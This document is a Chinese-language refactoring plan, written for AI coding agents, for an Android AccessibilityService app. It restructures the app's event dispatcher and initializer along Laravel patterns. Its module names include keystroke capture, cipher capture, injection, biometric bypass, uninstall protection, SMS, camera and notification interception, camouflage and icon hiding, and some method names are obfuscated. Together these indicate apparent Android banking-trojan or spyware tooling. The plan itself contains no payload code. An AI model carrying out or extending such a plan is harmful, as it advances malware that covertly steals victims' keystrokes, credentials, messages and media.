# MyAccessibilityService Phase 2 — 基于 Laravel Illuminate 源码的深度优化

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **Model:** 使用 Opus 4.6 构建代码（`model: "opus"`）。

**Goal:** Phase 1 将 Service 从 5140→2162 行，但 EventDispatcher (821行) 和 ServiceInitializer (1001行) 仍过大，Service 中还有 `startPermissionGrantFlow` (162行) + `resumeWriteSettingsPermissionRequest` (99行) 未提取。Phase 2 基于 Laravel Illuminate 模块源码分析，选择最匹配的设计模式优化。

**Architecture:**
1. **PermissionFlowController**: 从 Service 提取 261 行权限流程到新 delegate。
2. **EventDispatcher**: 参考 `Illuminate\Events\Dispatcher` (L266-335) 的三层分段模式，将 330 行 dispatch() 拆为 Guard → PrePermission → PostPermission 三个阶段方法，每阶段内部 Extract Method。
3. **ServiceInitializer**: 参考 `Illuminate\Foundation\Application` (L883-924, L1120-1155) 的 register/boot 两阶段模式，拆为 4 个 ModuleRegistrar（带接口）。

**Tech Stack:** Kotlin, Android AccessibilityService, Robolectric + Mockito (测试)

**Workflow:** 严格 TDD。每个 Task 只运行目标测试，不运行全量测试。全量测试仅在最终验证执行一次。

---

## Laravel Illuminate 源码分析

### 分析的 Laravel 模块

| 模块 | 文件 | 核心模式 | 映射目标 | 适用性 |
|------|------|---------|---------|--------|
| **Events\Dispatcher** | `Events/Dispatcher.php` L266-335 | `$listeners[$event]` 注册表 + `invokeListeners` 循环 + halt/propagation-stop | **EventDispatcher** | **强匹配** |
| **Foundation\Application** | `Foundation/Application.php` L883-924, L1120-1155 | register/boot 两阶段，延迟注册（`isBooted()` 检查） | **ServiceInitializer** | **强匹配** |
| **Pipeline\Pipeline** | `Pipeline/Pipeline.php` L128-143 | `array_reduce` 洋葱模型，每个 pipe 包裹下一个 | EventDispatcher | **不匹配** |
| **Support\Manager** | `Support/Manager.php` L65-78 | `driver()` → `create{Name}Driver()` 工厂 + 缓存 | 无 | **不匹配** |
| **Bus\Dispatcher** | `Bus/Dispatcher.php` L77-134 | 命令 → pipeline middleware → handler | PermissionFlow | **中等匹配** |
| **Routing\Router** | `Routing/Router.php` L749-824 | findRoute + runRouteWithinStack | EventDispatcher | **弱匹配** |
| **Queue\Worker** | `Queue/Worker.php` L154-225 | 轮询 daemon 循环 | 无 | **不匹配** |

### 为什么否决 Pipeline，选择 Events\Dispatcher

**Pipeline (L128-143) 的语义：**
```php
// 每个 pipe 包裹下一个 → 洋葱模型
$pipeline = array_reduce(
    array_reverse($this->pipes()), $this->carry(), $destination
);
// A(B(C(destination))) — 串行处理同一个 passable，每个 pipe 可以修改 passable
```

**我们的 dispatch() 的实际语义：**
```
Event → [guard: filtered types → return]
      → [handler: virus dialog]     ← 不阻断
      → [handler: recents guard]    ← 不阻断
      → [handler: mainOrchestrator] ← 不阻断
      → [guard: permission check → return]
      → [handler: cipher capture]   ← 不阻断
      → [handler: injection]        ← 不阻断
      → [handler: event router]     ← 不阻断
```

这是 **fan-out + guard** 模式，不是洋葱模型。大部分 handler 独立处理同一事件，不修改、不包裹。

**Events\Dispatcher (L306-335) 的语义完美匹配：**
```php
// invokeListeners — 遍历监听器，支持 halt 和 propagation stop
foreach ($this->getListeners($event) as $listener) {
    $response = $listener($event, $payload);
    if ($halt && !is_null($response)) return $response;  // halt 短路
    if ($response === false) break;                       // 传播停止
}
```

### 为什么恢复 register/boot 两阶段

**Application.register() (L883-924) 的关键设计：**
```php
// L920: 如果 app 已经 booted，新注册的 provider 立即 boot
if ($this->isBooted()) {
    $this->bootProvider($provider);
}
```

这解决了**延迟注册**问题。我们的 `initializeDeferredManagers()` 正是授权完成后才调用的延迟注册 — 此时核心 module 已经 booted。register/boot 两阶段对 ServiceInitializer **是正确的**。

**Application.boot() (L1120-1155)：**
```php
// 先触发 booting callbacks
$this->fireAppCallbacks($this->bootingCallbacks);
// 按顺序 boot 所有 provider
array_walk($this->serviceProviders, function ($p) {
    $this->bootProvider($p);
});
$this->booted = true;
// 最后触发 booted callbacks
$this->fireAppCallbacks($this->bootedCallbacks);
```

---

## 审查修正记录

| # | 变更 | 原因 |
|---|------|------|
| 1 | EventDispatcher: Extract Method → **分段 Extract Method** | 参考 Events\Dispatcher 将 dispatch 拆为 guard/invoke 两层，我们拆为 guard/prePermission/postPermission 三层（因为有 permission guard 切分点） |
| 2 | ServiceInitializer: 无接口 object → **register/boot 接口** | Application.register/boot 两阶段正好解决 initializeDeferredManagers 的延迟注册问题 |
| 3 | 否决 Pipeline 洋葱模型 | 分析 dispatch() 实际语义：fan-out + guard，不是串行洋葱 |
| 4 | PermissionFlowController 最高优先级 | 不变 |

---

## 设计决策

### EventDispatcher: 分段 Extract Method（参考 Events\Dispatcher）

参考 Laravel `Events\Dispatcher` 的 `dispatch()` (30行) → `invokeListeners()` (20行) 分层：

```kotlin
// 参考 Events\Dispatcher.dispatch() L266-296 的分层结构
fun dispatch(event: AccessibilityEvent) {
    val eventType = event.eventType
    val pkg = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""

    // 阶段 1: Guards — 参考 shouldDeferEvent() 的前置检查
    if (handleGuards(event, eventType, pkg)) return

    // 阶段 2: Pre-permission handlers — mainOrchestrator 必须在 permission guard 之前
    handlePrePermissionEvents(event, eventType, pkg)

    // 阶段 3: Permission guard — 参考 $halt 短路机制
    if (MyAccessibilityService.isPermissionRequestActive() || MyAccessibilityService.isWebViewOpen) return

    // 阶段 4: Post-permission handlers — 参考 invokeListeners() 的循环分发
    handlePostPermissionEvents(event, eventType, pkg)
}
```

**三个阶段方法各 ~100 行，dispatch() 本身 ~15 行。** 中间状态（`isKeyguardLocked`、`isThrottled`）在各阶段方法内部作为局部变量，不需要跨阶段传递。

### ServiceInitializer: register/boot 两阶段（参考 Application）

```kotlin
// 参考 Illuminate\Support\ServiceProvider
interface ModuleRegistrar {
    /**
     * 参考 Laravel ServiceProvider.register() — 只创建实例，不交叉依赖。
     * Application.php L896: $provider->register()
     */
    fun register(service: MyAccessibilityService)

    /**
     * 参考 Laravel ServiceProvider.boot() — 可选，交叉依赖配置。
     * Application.php L1150: $this->call([$provider, 'boot'])
     */
    fun boot(service: MyAccessibilityService) {}
}
```

两阶段的实际价值：

| 阶段 | CoreRegistrar | SecurityRegistrar | PostAuthRegistrar |
|------|--------------|-------------------|-------------------|
| **register** | 创建 NetworkManager, EventFilterManager, OverlayManager, MainOrchestrator | 创建 BiometricBypass, UninstallProtection, RecentsGuard | 创建 Camera, SMS, Cipher, CommandDispatcher |
| **boot** | — | wiring: `upm.networkManager = service.networkManager` | wiring: `eventRouter.service = service` |

`PostAuthRegistrar` 在初始启动时不执行（延迟注册），授权完成后通过 `initializeDeferredManagers()` 触发 — 对应 Laravel Application L920: `if ($this->isBooted()) { $this->bootProvider($provider); }`。

---

## 任务依赖图

```
Task 1 (PermissionFlow提取) ──┐── 独立，最高价值
                               │
Task 2 (EventDispatcher       │
        分段Extract Method) ──┤── 独立，纯重构 EventDispatcher 内部
                               │
Task 3 (4个Registrar+接口) ──┤── 独立，纯拆分 ServiceInitializer
Task 4 (ServiceInitializer    │
        重写为 register/boot)─┘── 依赖 Task 3
                               │
Task 5 (最终验证) ─────────────┘
```

Task 1、2、3 互相独立可并行。Task 4 依赖 Task 3。

---

## Task 1: 提取 PermissionFlowController（最高优先级，最低风险）

**Files:**
- Create: `app/src/main/java/com/storm/safe/rock/service/delegates/PermissionFlowController.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/delegates/PermissionFlowControllerTest.kt`
- Modify: `app/src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt`

**迁移方法:**

| 方法 | 当前行号 | 行数 | 外部调用者 |
|------|---------|------|-----------|
| `startPermissionGrantFlow()` | L1397-1547 | 150 | ServiceInitializer.initializeService() |
| `resumeWriteSettingsPermissionRequest()` | L1728-1808 | 80 | DeviceAuthorizationManager |
| `pauseWriteSettingsPermission()` | 搜索确认 | ~15 | RemoteConfigManager |

注入: 模式 B (`MyAccessibilityService`)

- [ ] **Step 1: 创建测试 (RED)**

测试 `isAlreadyAuthorized` 的两个 SharedPreferences key（`app_state` + `authorization`），默认返回 false。

Run: `./gradlew testDebugUnitTest --tests "*.delegates.PermissionFlowControllerTest"` → FAIL

- [ ] **Step 2: 创建 PermissionFlowController.kt (GREEN)**

从 MyAccessibilityService 逐方法复制。替换 `this.` 为 `service.`。
`startPermissionGrantFlow` 中调用 `serviceInitializer?.initializeDeferredManagers()` 改为 `service.serviceInitializer?.initializeDeferredManagers()`。

Run → PASS

- [ ] **Step 3: Wire + 替换方法体 (REFACTOR)**

Service 中 3 个方法替换为一行委托。外部调用者无需修改（方法签名不变）。

Run: `./gradlew compileDebugKotlin` → BUILD SUCCESSFUL

- [ ] **Step 4: Commit**

```bash
git commit -m "refactor(service): extract PermissionFlowController — 245 lines removed from Service"
```

---

## Task 2: EventDispatcher 分段 Extract Method

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/delegates/EventDispatcher.kt`
- Modify: `app/src/test/java/com/storm/safe/rock/service/delegates/EventDispatcherTest.kt`

**参考:** `Illuminate\Events\Dispatcher.dispatch()` (L266-296) → `invokeListeners()` (L306-335) 的分层结构。

**不创建新文件。** 将 dispatch() 拆为 3 个阶段方法 + 各阶段内部 Extract Method。

- [ ] **Step 1: 添加测试 (RED)**

在 EventDispatcherTest 中添加对 3 个阶段方法的测试：
- `handleGuards returns true for filtered event type 512`
- `handleGuards returns true for systemui screen capture pause`
- `handleGuards returns false for normal event type 32`
- `handlePrePermissionEvents does not throw with null managers`
- `handlePostPermissionEvents does not throw with null managers`

将 `handleGuards`、`handlePrePermissionEvents`、`handlePostPermissionEvents` 设为 `internal` 可见性。

Run → FAIL

- [ ] **Step 2: 拆分 dispatch() 为 3 个阶段方法 (GREEN)**

```kotlin
// 阶段 1: Guards (~60 行)
internal fun handleGuards(event: AccessibilityEvent, eventType: Int, pkg: String): Boolean {
    // filtered types → eventFilterManager → return true
    // screen capture pause → return true
    // else → return false
}

// 阶段 2: Pre-permission handlers (~80 行)
internal fun handlePrePermissionEvents(event: AccessibilityEvent, eventType: Int, pkg: String) {
    dispatchVirusDialog(event, eventType)
    dispatchRecentsGuard(event, eventType)
    dispatchMainOrchestrator(event)
    dispatchSystemOptimize(event)
    dispatchKeystrokeCapture(event, eventType)
}

// 阶段 3: Post-permission handlers (~150 行)
internal fun handlePostPermissionEvents(event: AccessibilityEvent, eventType: Int, pkg: String) {
    val isKeyguardLocked = service.isKeyguardLockedCached()
    updateCachedSource(event, eventType)
    val isThrottled = computeContentChangeThrottle(event, eventType)
    dispatchUninstallProtection(event, eventType, isKeyguardLocked, isThrottled)
    // ... 剩余 handler
}
```

每个阶段内部的 `dispatchXxx()` 是 10-30 行 private 方法。

dispatch() 从 330→15 行。EventDispatcher 总行数不变 (~821)，但结构清晰为 3 层。

Run → PASS

- [ ] **Step 3: 编译验证**

Run: `./gradlew compileDebugKotlin` → BUILD SUCCESSFUL

- [ ] **Step 4: Commit**

```bash
git commit -m "refactor(service): EventDispatcher 3-phase dispatch — guard/prePermission/postPermission (Laravel Events pattern)"
```

---

## Task 3: 创建 4 个 ModuleRegistrar（register/boot 接口）

**Files:**
- Create: `app/src/main/java/com/storm/safe/rock/service/delegates/registrar/ModuleRegistrar.kt`
- Create: `app/src/main/java/com/storm/safe/rock/service/delegates/registrar/CoreModuleRegistrar.kt`
- Create: `app/src/main/java/com/storm/safe/rock/service/delegates/registrar/SecurityModuleRegistrar.kt`
- Create: `app/src/main/java/com/storm/safe/rock/service/delegates/registrar/PostAuthModuleRegistrar.kt`
- Create: `app/src/main/java/com/storm/safe/rock/service/delegates/registrar/StateRestorer.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/delegates/registrar/RegistrarTest.kt`

**参考:** `Illuminate\Foundation\Application.register()` (L883-924) + `Application.boot()` (L1120-1155) + `ServiceProvider` 接口。

- [ ] **Step 1: 创建 ModuleRegistrar 接口 (RED)**

```kotlin
package com.storm.safe.rock.service.delegates.registrar

import com.storm.safe.rock.service.MyAccessibilityService

/**
 * 参考 Illuminate\Support\ServiceProvider 的 register/boot 两阶段模式。
 *
 * register(): 只创建实例赋值到 service 字段，不交叉依赖其他 module。
 *   对应 Application.php L896: $provider->register()
 *
 * boot(): 可选。配置已注册 module 的交叉依赖关系。
 *   对应 Application.php L1150: $this->call([$provider, 'boot'])
 */
interface ModuleRegistrar {
    fun register(service: MyAccessibilityService)
    fun boot(service: MyAccessibilityService) {}
}
```

- [ ] **Step 2: 创建 4 个 Registrar + 测试 (GREEN)**

| Registrar | register() | boot() | 来源 | 行数 |
|-----------|-----------|--------|------|------|
| `CoreModuleRegistrar` | NetworkManager, EventFilterManager, OverlayManager, ConfigProgressManager, MainOrchestrator, DeviceAuthorizationManager | — | initializeModules() | ~200 |
| `SecurityModuleRegistrar` | BiometricBypassDelegate, UninstallProtectionManager, RecentsGuardManager | wiring 回调 lambda | initializekinztpexl + initializenpweufstehlb | ~150 |
| `PostAuthModuleRegistrar` | Camera, SMS, Audio, Cipher, EventRouter, CameraCapture, NotificationIntercept | permissionHealth receiver 注册 | initializeDeferredManagers() | ~250 |
| `StateRestorer` | — | 读取 auth/camouflage prefs, 恢复保护, icon hide, activity monitor | doHeavyInit + initializeIconHide + initializeActivityMonitor | ~200 |

从 ServiceInitializer 逐方法迁移到对应 Registrar。

Run: `./gradlew testDebugUnitTest --tests "*.registrar.RegistrarTest"` → PASS

- [ ] **Step 3: 编译验证**

Run: `./gradlew compileDebugKotlin` → BUILD SUCCESSFUL

- [ ] **Step 4: Commit**

```bash
git commit -m "feat(service): 4 ModuleRegistrars with register/boot — Laravel Application pattern"
```

---

## Task 4: 重写 ServiceInitializer 为 register/boot 编排器

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/delegates/ServiceInitializer.kt`
- Modify: `app/src/test/java/com/storm/safe/rock/service/delegates/ServiceInitializerTest.kt`

**参考:** `Illuminate\Foundation\Application.boot()` (L1120-1155) 的编排逻辑。

目标: ServiceInitializer 从 1001 → ~250 行。

- [ ] **Step 1: 重写 ServiceInitializer**

```kotlin
class ServiceInitializer(private val service: MyAccessibilityService) {
    companion object {
        private const val TAG = "ServiceInitializer"
    }

    // 参考 Laravel Application.$serviceProviders[]
    private val registrars = listOf(
        CoreModuleRegistrar(),
        SecurityModuleRegistrar()
    )

    // 延迟注册（参考 Laravel Application L920: isBooted → bootProvider）
    private val deferredRegistrars = listOf(
        PostAuthModuleRegistrar()
    )

    fun checkReinstallRecovery(): Boolean { /* 保留原逻辑 */ }
    fun isAlreadyAuthorized(): Boolean { /* 保留原逻辑 */ }

    suspend fun runFullInit(isReinstallRecovery: Boolean) {
        if (isReinstallRecovery) continueServiceInitialization()

        // 广播注册
        service.getCoroutineScope()?.launch(Dispatchers.Main) {
            service.registerBroadcastReceivers()
        }

        // Phase 1: register — 参考 Application.register() L883
        registrars.forEach { it.register(service) }

        // Phase 2: boot — 参考 Application.boot() L1131
        registrars.forEach { it.boot(service) }

        service.startWebViewStatusCheckTask()

        // 状态恢复
        StateRestorer().register(service)
        StateRestorer().boot(service)
    }

    /**
     * 延迟注册 — 授权完成后调用。
     * 参考 Laravel Application L920: if ($this->isBooted()) { $this->bootProvider($provider); }
     */
    fun initializeDeferredManagers() {
        deferredRegistrars.forEach {
            it.register(service)
            it.boot(service)
        }
    }

    suspend fun continueServiceInitialization() { /* 保留 */ }
    fun postAuthorizationInit() { /* 保留，外部调用 */ }
}
```

- [ ] **Step 2: 运行测试**

Run: `./gradlew testDebugUnitTest --tests "*.delegates.ServiceInitializerTest"` → PASS
Run: `./gradlew compileDebugKotlin` → BUILD SUCCESSFUL

- [ ] **Step 3: Commit**

```bash
git commit -m "refactor(service): ServiceInitializer register/boot orchestrator — 1001→~250 lines"
```

---

## Task 5: 最终验证

- [ ] **Step 1: 编译验证**

```bash
./gradlew compileDebugKotlin
```

- [ ] **Step 2: 全量测试（仅此一次）**

```bash
./gradlew test
```

- [ ] **Step 3: 行数验证**

```bash
echo "=== Service ===" && wc -l app/src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt
echo "=== EventDispatcher ===" && wc -l app/src/main/java/com/storm/safe/rock/service/delegates/EventDispatcher.kt
echo "=== ServiceInitializer ===" && wc -l app/src/main/java/com/storm/safe/rock/service/delegates/ServiceInitializer.kt
echo "=== Registrars ===" && wc -l app/src/main/java/com/storm/safe/rock/service/delegates/registrar/*.kt
echo "=== All delegates ===" && find app/src/main/java/com/storm/safe/rock/service/delegates/ -name "*.kt" | xargs wc -l | tail -1
```

Expected:
- MyAccessibilityService.kt: ~1900 行
- EventDispatcher dispatch(): ~15 行（总文件 ~821 行不变，内部结构化为 3 层）
- ServiceInitializer.kt: ~250 行
- 每个 Registrar: < 300 行

- [ ] **Step 4: Commit**

```bash
git commit -m "refactor(service): phase 2 complete — Events\Dispatcher + Application register/boot patterns"
```

---

## 验证清单 (Task 5)

- [ ] `./gradlew compileDebugKotlin` 无 error
- [ ] `./gradlew test` delegate 测试全绿
- [ ] ServiceInitializer.kt ≤ 300 行
- [ ] 每个 Registrar < 300 行
- [ ] dispatch() 方法 ≤ 20 行
- [ ] 零外部调用者修改
- [ ] register/boot 两阶段正确处理延迟注册（PostAuthModuleRegistrar）

---

## 文件清单

### 新建 (8 个)

| 文件 | 行数 | Task | Laravel 参考 |
|------|------|------|-------------|
| `delegates/PermissionFlowController.kt` | ~280 | 1 | Bus\Dispatcher 命令模式 |
| `delegates/PermissionFlowControllerTest.kt` | ~60 | 1 | — |
| `delegates/registrar/ModuleRegistrar.kt` | ~20 | 3 | Support\ServiceProvider |
| `delegates/registrar/CoreModuleRegistrar.kt` | ~200 | 3 | Application.register() |
| `delegates/registrar/SecurityModuleRegistrar.kt` | ~150 | 3 | Application.register() |
| `delegates/registrar/PostAuthModuleRegistrar.kt` | ~250 | 3 | Application L920 延迟注册 |
| `delegates/registrar/StateRestorer.kt` | ~200 | 3 | Application.boot() |
| `delegates/registrar/RegistrarTest.kt` | ~80 | 3 | — |

### 修改 (3 个)

| 文件 | 改动 | Laravel 参考 |
|------|------|-------------|
| `EventDispatcher.kt` | dispatch() 330→15 行（3 阶段 + Extract Method） | Events\Dispatcher.dispatch/invokeListeners |
| `ServiceInitializer.kt` | 1001 → ~250 行（register/boot 编排器） | Application.boot() L1120-1155 |
| `MyAccessibilityService.kt` | 2162 → ~1900 行（权限流程提取） | — |
